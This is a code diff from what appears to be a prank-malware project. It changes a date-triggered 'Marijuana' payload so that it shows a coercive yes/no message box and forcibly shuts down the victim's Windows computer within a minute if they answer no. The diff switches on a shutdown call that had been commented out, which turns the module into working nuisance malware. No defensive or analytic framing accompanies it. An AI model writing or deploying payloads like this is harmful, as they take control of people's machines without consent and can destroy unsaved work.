@@ -8,6 +8,7 @@
  */
 const Payload = require('./Payload')
 
+const Flags = require('../winapi/flags')
 const logger = require('../Logger')
 const utils = require('../Utils')
 
@@ -16,13 +17,13 @@ module.exports = class MarijuanaPayload extends Payload {
     super('Marijuana', 'Shutsdown computer if you say you won\'t smoke the weeds', utils.makeDate(12, 31))
   }
   async run() {
-    const res = utils.messageBox('Are you gonna smoke weed', 'Smonk Alert', {
-      service: true,
-      foreground: true,
-      topMost: true,
-      systemModal: true
+    const res = await utils.maliciousMessageBox('Are you going to smoke the marijuanas?', 'Smonk Alert', {
+      flags: Flags.MB_YESNO
     })
-    logger.debug(res)
-    //utils.shutdown('Please don\'t turn your computer back on until you smoke the dank weeds', '260s')
+    if (res != Flags.MB_BTN_YES) {
+      utils.shutdown('Please don\'t turn your computer back on until you smoke the dank weeds', '1m')
+    } else {
+      await utils.maliciousMessageBox('Good, do that smonking and do it good', 'Smonk Alert')
+    }
   }
 }
